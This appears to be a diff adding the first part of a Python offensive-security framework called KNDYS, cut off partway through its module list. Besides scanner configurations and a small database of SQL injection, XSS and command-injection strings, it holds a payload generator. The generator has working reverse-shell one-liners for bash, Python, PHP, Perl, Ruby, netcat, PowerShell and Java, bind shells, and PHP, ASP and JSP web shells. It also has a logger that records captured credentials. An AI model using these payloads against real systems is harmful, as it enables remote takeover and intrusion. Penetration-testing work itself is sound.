@@ -1,0 +1,800 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import os
+import sys
+import time
+import random
+import threading
+import socket
+import subprocess
+import json
+import hashlib
+import base64
+import re
+import ssl
+import zipfile
+import tarfile
+import gzip
+import csv
+import shutil
+import xml.etree.ElementTree as ET
+from datetime import datetime
+from urllib.parse import urlparse, urljoin, quote, unquote
+import concurrent.futures
+import ipaddress
+import itertools
+import string
+import struct
+import platform
+import argparse
+import readline
+import getpass
+import mimetypes
+from pathlib import Path
+from typing import Dict, List, Tuple, Optional, Any
+from functools import wraps
+from collections import deque
+import queue
+import logging
+
+# External libraries (install with: pip install -r requirements.txt)
+try:
+    import requests
+    from requests.packages.urllib3.exceptions import InsecureRequestWarning
+    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+except ImportError:
+    print("[-] Requests library not found. Install with: pip install requests")
+    sys.exit(1)
+
+try:
+    from colorama import Fore, Style, Back, init
+    init(autoreset=True)
+    COLORS = True
+except ImportError:
+    # Fallback to basic colors
+    class Fore:
+        RED = YELLOW = GREEN = BLUE = MAGENTA = CYAN = WHITE = RESET = ''
+    COLORS = False
+
+try:
+    from cryptography.fernet import Fernet
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    CRYPTO_AVAILABLE = False
+
+try:
+    import paramiko
+    SSH_AVAILABLE = True
+except ImportError:
+    SSH_AVAILABLE = False
+
+try:
+    from scapy.all import *
+    SCAPY_AVAILABLE = True
+except ImportError:
+    SCAPY_AVAILABLE = False
+
+try:
+    import nmap
+    NMAP_AVAILABLE = True
+except ImportError:
+    NMAP_AVAILABLE = False
+
+try:
+    from bs4 import BeautifulSoup
+    BS4_AVAILABLE = True
+except ImportError:
+    BS4_AVAILABLE = False
+
+try:
+    import sqlite3
+    DB_AVAILABLE = True
+except ImportError:
+    DB_AVAILABLE = False
+
+# Banner
+BANNER = f"""
+{Fore.CYAN}{Style.BRIGHT}
+╔══════════════════════════════════════════════════╗
+║                                                  ║
+║    ██╗  ██╗███╗   ██╗██████╗ ██╗   ██╗███████╗   ║
+║    ██║ ██╔╝████╗  ██║██╔══██╗╚██╗ ██╔╝██╔════╝   ║
+║    █████╔╝ ██╔██╗ ██║██║  ██║ ╚████╔╝ ███████╗   ║ 
+║    ██╔═██╗ ██║╚██╗██║██║  ██║  ╚██╔╝  ╚════██║   ║
+║    ██║  ██╗██║ ╚████║██████╔╝   ██║   ███████║   ║
+║    ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝   ╚══════╝   ║
+║                                                  ║
+║{Fore.WHITE}"u must take your pills"{Fore.CYAN}   ║
+║ {Fore.YELLOW}v3.0{Fore.CYAN}                     ║
+║                                                  ║
+╚══════════════════════════════════════════════════╝
+{Style.RESET_ALL}"""
+
+# ============ SECURITY AND UTILITY CLASSES ============
+
+class InputValidator:
+    """Input validation and sanitization"""
+    
+    @staticmethod
+    def validate_ip(ip_str):
+        """Validate IP address"""
+        try:
+            ipaddress.ip_address(ip_str)
+            return True
+        except ValueError:
+            return False
+    
+    @staticmethod
+    def validate_port(port):
+        """Validate port number"""
+        try:
+            port_num = int(port)
+            return 1 <= port_num <= 65535
+        except (ValueError, TypeError):
+            return False
+    
+    @staticmethod
+    def validate_url(url):
+        """Validate URL format"""
+        try:
+            result = urlparse(url)
+            return all([result.scheme in ['http', 'https'], result.netloc])
+        except:
+            return False
+    
+    @staticmethod
+    def sanitize_command(cmd):
+        """Sanitize command for safe execution"""
+        # Remove dangerous characters
+        dangerous = [';', '|', '&', '`', '$', '(', ')', '<', '>', '\n', '\r']
+        sanitized = cmd
+        for char in dangerous:
+            if char in sanitized:
+                return None  # Reject dangerous commands
+        return sanitized
+    
+    @staticmethod
+    def sanitize_path(path):
+        """Sanitize file path"""
+        # Prevent directory traversal
+        if '..' in path or path.startswith('/'):
+            return None
+        return os.path.normpath(path)
+    
+    @staticmethod
+    def validate_email(email):
+        """Validate email address"""
+        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
+        return re.match(pattern, email) is not None
+
+class RateLimiter:
+    """Rate limiting for requests"""
+    
+    def __init__(self, max_requests=10, time_window=60):
+        self.max_requests = max_requests
+        self.time_window = time_window
+        self.requests = deque()
+        self.lock = threading.Lock()
+    
+    def allow_request(self):
+        """Check if request is allowed"""
+        with self.lock:
+            now = time.time()
+            
+            # Remove old requests outside time window
+            while self.requests and self.requests[0] < now - self.time_window:
+                self.requests.popleft()
+            
+            # Check if we've exceeded limit
+            if len(self.requests) >= self.max_requests:
+                return False
+            
+            # Add new request
+            self.requests.append(now)
+            return True
+    
+    def wait_if_needed(self):
+        """Wait if rate limit exceeded"""
+        while not self.allow_request():
+            time.sleep(0.1)
+
+class SessionManager:
+    """Manage active sessions with timeouts"""
+    
+    def __init__(self):
+        self.sessions = {}
+        self.session_timeout = 3600  # 1 hour
+        self.lock = threading.Lock()
+    
+    def create_session(self, session_id, data=None):
+        """Create new session"""
+        with self.lock:
+            self.sessions[session_id] = {
+                'data': data or {},
+                'created': time.time(),
+                'last_activity': time.time()
+            }
+        return session_id
+    
+    def get_session(self, session_id):
+        """Get session data"""
+        with self.lock:
+            if session_id in self.sessions:
+                session = self.sessions[session_id]
+                
+                # Check if session expired
+                if time.time() - session['last_activity'] > self.session_timeout:
+                    del self.sessions[session_id]
+                    return None
+                
+                # Update last activity
+                session['last_activity'] = time.time()
+                return session['data']
+            return None
+    
+    def update_session(self, session_id, data):
+        """Update session data"""
+        with self.lock:
+            if session_id in self.sessions:
+                self.sessions[session_id]['data'].update(data)
+                self.sessions[session_id]['last_activity'] = time.time()
+    
+    def close_session(self, session_id):
+        """Close and cleanup session"""
+        with self.lock:
+            if session_id in self.sessions:
+                del self.sessions[session_id]
+    
+    def cleanup_expired(self):
+        """Cleanup expired sessions"""
+        with self.lock:
+            now = time.time()
+            expired = [
+                sid for sid, session in self.sessions.items()
+                if now - session['last_activity'] > self.session_timeout
+            ]
+            for sid in expired:
+                del self.sessions[sid]
+
+class ConnectionPool:
+    """Connection pooling and management"""
+    
+    def __init__(self, max_connections=50):
+        self.max_connections = max_connections
+        self.active_connections = 0
+        self.semaphore = threading.Semaphore(max_connections)
+        self.lock = threading.Lock()
+    
+    def acquire(self):
+        """Acquire connection from pool"""
+        self.semaphore.acquire()
+        with self.lock:
+            self.active_connections += 1
+    
+    def release(self):
+        """Release connection back to pool"""
+        self.semaphore.release()
+        with self.lock:
+            self.active_connections -= 1
+    
+    def get_active_count(self):
+        """Get number of active connections"""
+        with self.lock:
+            return self.active_connections
+
+class ErrorHandler:
+    """Centralized error handling"""
+    
+    def __init__(self, logger):
+        self.logger = logger
+        self.error_counts = {}
+        self.lock = threading.Lock()
+    
+    def handle_error(self, error, context="", fatal=False):
+        """Handle error with logging and tracking"""
+        error_type = type(error).__name__
+        error_msg = str(error)
+        
+        # Track error frequency
+        with self.lock:
+            self.error_counts[error_type] = self.error_counts.get(error_type, 0) + 1
+        
+        # Log error
+        log_msg = f"{context}: {error_type} - {error_msg}"
+        self.logger.log(log_msg, "ERROR")
+        
+        # Display to user
+        print(f"{Fore.RED}[!] Error: {error_msg}{Style.RESET_ALL}")
+        if context:
+            print(f"{Fore.YELLOW}[*] Context: {context}{Style.RESET_ALL}")
+        
+        # If fatal, provide recovery suggestions
+        if fatal:
+            print(f"{Fore.RED}[!] Fatal error - operation aborted{Style.RESET_ALL}")
+            self.suggest_recovery(error_type)
+    
+    def suggest_recovery(self, error_type):
+        """Suggest recovery actions"""
+        suggestions = {
+            'ConnectionError': 'Check network connectivity and target availability',
+            'TimeoutError': 'Increase timeout value or check target responsiveness',
+            'PermissionError': 'Check file permissions or run with appropriate privileges',
+            'ValueError': 'Verify input parameters and format',
+            'KeyError': 'Check configuration options are properly set'
+        }
+        
+        if error_type in suggestions:
+            print(f"{Fore.CYAN}[→] Suggestion: {suggestions[error_type]}{Style.RESET_ALL}")
+    
+    def get_error_stats(self):
+        """Get error statistics"""
+        with self.lock:
+            return dict(self.error_counts)
+
+def retry_on_failure(max_retries=3, delay=1, backoff=2):
+    """Decorator for retrying failed operations"""
+    def decorator(func):
+        @wraps(func)
+        def wrapper(*args, **kwargs):
+            retries = 0
+            current_delay = delay
+            
+            while retries < max_retries:
+                try:
+                    return func(*args, **kwargs)
+                except Exception as e:
+                    retries += 1
+                    if retries >= max_retries:
+                        raise
+                    
+                    print(f"{Fore.YELLOW}[*] Retry {retries}/{max_retries} after {current_delay}s...{Style.RESET_ALL}")
+                    time.sleep(current_delay)
+                    current_delay *= backoff
+            
+        return wrapper
+    return decorator
+
+class Logger:
+    """Enhanced logging system with rotation and encryption"""
+    def __init__(self):
+        self.log_file = f"kndys_session_{int(time.time())}.log"
+        self.session_file = f"kndys_session_{int(time.time())}.json"
+        self.max_log_size = 10 * 1024 * 1024  # 10MB
+        self.lock = threading.Lock()
+        
+        # Setup Python logging
+        logging.basicConfig(
+            level=logging.INFO,
+            format='%(asctime)s [%(levelname)s] %(message)s',
+            handlers=[
+                logging.FileHandler(self.log_file),
+                logging.StreamHandler(sys.stdout)
+            ]
+        )
+        self.python_logger = logging.getLogger('KNDYS')
+        
+    def log(self, message, level="INFO"):
+        """Log message to file with rotation"""
+        with self.lock:
+            try:
+                # Check log file size and rotate if needed
+                if os.path.exists(self.log_file):
+                    if os.path.getsize(self.log_file) > self.max_log_size:
+                        self.rotate_log()
+                
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                log_entry = f"[{timestamp}] [{level}] {message}"
+                
+                with open(self.log_file, 'a', encoding='utf-8') as f:
+                    f.write(log_entry + "\n")
+                
+                # Also use Python logging
+                log_level = getattr(logging, level, logging.INFO)
+                self.python_logger.log(log_level, message)
+                    
+                # Save to session file
+                self.save_session(message)
+            except Exception as e:
+                print(f"{Fore.RED}[!] Logging error: {str(e)}{Style.RESET_ALL}")
+    
+    def rotate_log(self):
+        """Rotate log file when it gets too large"""
+        try:
+            timestamp = int(time.time())
+            backup_file = f"{self.log_file}.{timestamp}"
+            shutil.move(self.log_file, backup_file)
+            print(f"{Fore.YELLOW}[*] Log rotated to {backup_file}{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}[!] Log rotation failed: {str(e)}{Style.RESET_ALL}")
+        
+    def save_session(self, data):
+        """Save data to session file with error handling"""
+        try:
+            if os.path.exists(self.session_file):
+                with open(self.session_file, 'r', encoding='utf-8') as f:
+                    session_data = json.load(f)
+            else:
+                session_data = {
+                    "actions": [], 
+                    "findings": [], 
+                    "credentials": [],
+                    "errors": [],
+                    "start_time": datetime.now().isoformat()
+                }
+                
+            session_data["actions"].append({
+                "timestamp": datetime.now().isoformat(),
+                "data": str(data)[:1000]  # Limit data size
+            })
+            
+            with open(self.session_file, 'w', encoding='utf-8') as f:
+                json.dump(session_data, f, indent=2)
+        except Exception as e:
+            # Silent fail for session save to not interrupt operations
+            pass
+    
+    def save_finding(self, finding_type, data):
+        """Save security finding"""
+        try:
+            if os.path.exists(self.session_file):
+                with open(self.session_file, 'r', encoding='utf-8') as f:
+                    session_data = json.load(f)
+            else:
+                session_data = {"actions": [], "findings": [], "credentials": []}
+            
+            session_data["findings"].append({
+                "timestamp": datetime.now().isoformat(),
+                "type": finding_type,
+                "data": data
+            })
+            
+            with open(self.session_file, 'w', encoding='utf-8') as f:
+                json.dump(session_data, f, indent=2)
+        except:
+            pass
+    
+    def save_credential(self, username, password, source):
+        """Save captured credential"""
+        try:
+            if os.path.exists(self.session_file):
+                with open(self.session_file, 'r', encoding='utf-8') as f:
+                    session_data = json.load(f)
+            else:
+                session_data = {"actions": [], "findings": [], "credentials": []}
+            
+            session_data["credentials"].append({
+                "timestamp": datetime.now().isoformat(),
+                "username": username,
+                "password": hashlib.sha256(password.encode()).hexdigest(),  # Hash for security
+                "source": source
+            })
+            
+            with open(self.session_file, 'w', encoding='utf-8') as f:
+                json.dump(session_data, f, indent=2)
+        except:
+            pass
+
+class ExploitDB:
+    """Local exploit database"""
+    def __init__(self):
+        self.exploits = self.load_exploits()
+        
+    def load_exploits(self):
+        """Load exploit database"""
+        exploits = {
+            # Web exploits
+            "web": [
+                {
+                    "id": "EX-001",
+                    "name": "SQL Injection Classic",
+                    "description": "Classic SQL injection attack",
+                    "type": "web",
+                    "port": 80,
+                    "payload": "' OR '1'='1' --"
+                },
+                {
+                    "id": "EX-002",
+                    "name": "XSS Reflected",
+                    "description": "Reflected Cross-Site Scripting",
+                    "type": "web",
+                    "port": 80,
+                    "payload": "<script>alert('XSS')</script>"
+                },
+                {
+                    "id": "EX-003",
+                    "name": "Command Injection",
+                    "description": "OS Command Injection",
+                    "type": "web",
+                    "port": 80,
+                    "payload": "; ls -la"
+                }
+            ],
+            # Network exploits
+            "network": [
+                {
+                    "id": "EX-101",
+                    "name": "SMB EternalBlue",
+                    "description": "MS17-010 SMB Vulnerability",
+                    "type": "network",
+                    "port": 445,
+                    "payload": "eternalblue"
+                },
+                {
+                    "id": "EX-102",
+                    "name": "Heartbleed",
+                    "description": "OpenSSL Heartbleed Vulnerability",
+                    "type": "network",
+                    "port": 443,
+                    "payload": "heartbleed"
+                }
+            ],
+            # Service-specific exploits
+            "services": [
+                {
+                    "id": "EX-201",
+                    "name": "FTP Anonymous Login",
+                    "description": "FTP server with anonymous login enabled",
+                    "type": "service",
+                    "port": 21,
+                    "payload": "anonymous"
+                },
+                {
+                    "id": "EX-202",
+                    "name": "SSH Brute Force",
+                    "description": "SSH password brute force attack",
+                    "type": "service",
+                    "port": 22,
+                    "payload": "ssh_brute"
+                }
+            ]
+        }
+        return exploits
+        
+    def search_exploits(self, query):
+        """Search for exploits"""
+        results = []
+        for category, exploit_list in self.exploits.items():
+            for exploit in exploit_list:
+                if query.lower() in exploit["name"].lower() or query.lower() in exploit["description"].lower():
+                    results.append(exploit)
+        return results
+
+class PayloadGenerator:
+    """Payload generation system"""
+    def __init__(self):
+        self.payloads = {}
+        self.load_payloads()
+        
+    def load_payloads(self):
+        """Load all payload templates"""
+        self.payloads = {
+            # Reverse Shells
+            "reverse_shell": {
+                "bash": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
+                "python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
+                "python3": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
+                "php": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+                "perl": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
+                "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+                "nc": "nc -e /bin/sh {LHOST} {LPORT}",
+                "nc_traditional": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
+                "powershell": """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
+                "java": """java -e 'String host="{LHOST}";int port={LPORT};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}} catch (Exception e){{}} }};p.destroy();s.close();'"""
+            },
+            
+            # Bind Shells
+            "bind_shell": {
+                "bash": "bash -i >& /dev/tcp/{LPORT}/0.0.0.0 0>&1",
+                "python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{LPORT}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
+                "nc": "nc -lvp {LPORT} -e /bin/sh"
+            },
+            
+            # Web Shells
+            "web_shell": {
+                "php": """<?php system($_GET['cmd']); ?>""",
+                "php_advanced": """<?php if(isset($_REQUEST['cmd'])){{echo "<pre>";$cmd = ($_REQUEST['cmd']);system($cmd);echo "</pre>";die;}} ?>""",
+                "asp": """<%@ Language=VBScript %><% If Request("cmd") <> "" Then ExecuteGlobal(Request("cmd")) %>""",
+                "jsp": """<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %>"""
+            },
+            
+            # Meterpreter Payloads
+            "meterpreter": {
+                "windows_x64": "windows/x64/meterpreter/reverse_tcp",
+                "windows_x86": "windows/meterpreter/reverse_tcp",
+                "linux_x64": "linux/x64/meterpreter/reverse_tcp",
+                "android": "android/meterpreter/reverse_tcp"
+            },
+            
+            # File Upload
+            "file_upload": {
+                "php_uploader": """<?php $uploaddir = '/tmp/'; $uploadfile = $uploaddir . basename($_FILES['file']['name']); if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) { echo "File uploaded successfully."; } else { echo "File upload failed."; } ?>"""
+            }
+        }
+        
+    def generate(self, payload_type, platform="bash", **kwargs):
+        """Generate payload with substitutions"""
+        if payload_type in self.payloads and platform in self.payloads[payload_type]:
+            payload = self.payloads[payload_type][platform]
+            for key, value in kwargs.items():
+                payload = payload.replace(f"{{{key}}}", str(value))
+            return payload
+        return None
+
+class KNDYSFramework:
+    """Main KNDYS Framework class with enhanced security"""
+    def __init__(self):
+        self.current_module = None
+        self.module_options = {}
+        self.targets = []
+        self.running = False
+        self.session_id = self.generate_session_id()
+        self.logger = Logger()
+        self.exploit_db = ExploitDB()
+        self.payload_gen = PayloadGenerator()
+        self.wordlists = {}
+        self.credentials = {}
+        
+        # Security components
+        self.validator = InputValidator()
+        self.rate_limiter = RateLimiter(max_requests=100, time_window=60)
+        self.session_manager = SessionManager()
+        self.connection_pool = ConnectionPool(max_connections=50)
+        self.error_handler = ErrorHandler(self.logger)
+        
+        self.load_config()
+        self.initialize_modules()
+        self.initialize_wordlists()
+        
+        # Start background cleanup thread
+        self.cleanup_thread = threading.Thread(target=self._background_cleanup, daemon=True)
+        self.cleanup_thread.start()
+        
+    def generate_session_id(self):
+        """Generate unique session ID"""
+        return hashlib.md5(str(time.time()).encode()).hexdigest()[:10]
+    
+    def load_config(self):
+        """Load configuration"""
+        self.config = {
+            "lhost": self.get_local_ip(),
+            "lport": 4444,
+            "rhost": "",
+            "rport": "",
+            "threads": 50,
+            "timeout": 5,
+            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "proxy": None,
+            "verbose": True
+        }
+    
+    def _background_cleanup(self):
+        """Background thread for cleanup tasks"""
+        while True:
+            try:
+                time.sleep(300)  # Every 5 minutes
+                self.session_manager.cleanup_expired()
+                self.logger.log("Background cleanup completed", "DEBUG")
+            except Exception as e:
+                self.error_handler.handle_error(e, "Background cleanup")
+    
+    def get_local_ip(self):
+        """Get local IP address with fallback"""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(2)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except Exception as e:
+            self.logger.log(f"Could not determine local IP: {str(e)}", "WARNING")
+            return "127.0.0.1"
+    
+    def display_banner(self):
+        """Display KNDYS banner"""
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(BANNER)
+        
+        # Show minimal startup hint
+        print(f"{Fore.WHITE}┌─[{Fore.CYAN}Quick Start{Fore.WHITE}]")
+        print(f"│ {Fore.GREEN}help{Fore.WHITE}             → Show all commands")
+        print(f"│ {Fore.GREEN}show modules{Fore.WHITE}     → List available modules")
+        print(f"│ {Fore.GREEN}show wordlists{Fore.WHITE}   → View password dictionaries")
+        print(f"└─────────────────────────────────────{Style.RESET_ALL}\n")
+        
+        # Show warnings for missing dependencies
+        missing = []
+        if not NMAP_AVAILABLE:
+            missing.append("python-nmap")
+        if not SCAPY_AVAILABLE:
+            missing.append("scapy")
+        if not SSH_AVAILABLE:
+            missing.append("paramiko")
+        if not BS4_AVAILABLE:
+            missing.append("beautifulsoup4")
+        
+        if missing:
+            print(f"{Fore.YELLOW}⚠  Optional dependencies missing: {Fore.WHITE}{', '.join(missing)}{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ  Install: {Fore.CYAN}pip install {' '.join(missing)}{Style.RESET_ALL}\n")
+    
+    def initialize_modules(self):
+        """Initialize all available modules"""
+        self.modules = {
+            # Reconnaissance Modules
+            'recon': {
+                'port_scanner': {
+                    'description': 'Professional port scanner: Service detection, banner grabbing, vulnerability checks, 90+ services database',
+                    'options': {
+                        'target': '192.168.1.1',
+                        'ports': '1-1000',
+                        'threads': '50',
+                        'timeout': '2',
+                        'scan_type': 'tcp_connect',
+                        'aggressive': 'false'
+                    }
+                },
+                'subdomain_scanner': {
+                    'description': 'Professional subdomain enumeration: DNS brute-force, Zone Transfer, Certificate Transparency, wildcard detection, HTTP verification',
+                    'options': {
+                        'domain': 'example.com',
+                        'wordlist': '',
+                        'threads': '20',
+                        'techniques': 'all',
+                        'verify_http': 'true',
+                        'output': 'subdomains.txt'
+                    }
+                },
+                'web_crawler': {
+                    'description': 'Advanced website crawler with vulnerability detection',
+                    'options': {
+                        'url': 'http://example.com',
+                        'depth': '3',
+                        'threads': '10',
+                        'extensions': 'php,html,asp,aspx,jsp'
+                    }
+                },
+                'network_mapper': {
+                    'description': 'Network discovery and mapping',
+                    'options': {
+                        'network': '192.168.1.0/24',
+                        'ping': 'true',
+                        'ports': '22,80,443,445'
+                    }
+                },
+                'os_detection': {
+                    'description': 'Remote OS detection using TCP/IP fingerprinting',
+                    'options': {
+                        'target': '192.168.1.1',
+                        'ports': '22,80,443'
+                    }
+                }
+            },
+            
+            # Vulnerability Scanning Modules
+            'scan': {
+                'vuln_scanner': {
+                    'description': 'Comprehensive vulnerability scanner with 33 checks',
+                    'options': {
+                        'target': 'http://example.com',
+                        'scan_type': 'full',  # quick, web, api, full
+                        'threads': '5',
+                        'depth': '2',
+                        'aggressive': 'false',
+                        'stealth_mode': 'false'
+                    }
+                },
+                'sql_scanner': {
+                    'description': 'Advanced SQL injection scanner with exploitation',
+                    'options': {
+                        'url': 'http://example.com/page.php?id=1',
+                        'technique': 'time_based,error_based,boolean',
+                        'threads': '5'
+                    }
+                },
+                'xss_scanner': {
+                    'description': 'Cross-Site Scripting vulnerability scanner',
+                    'options': {
+                        'url': 'http://example.com',
+                        'method': 'GET',
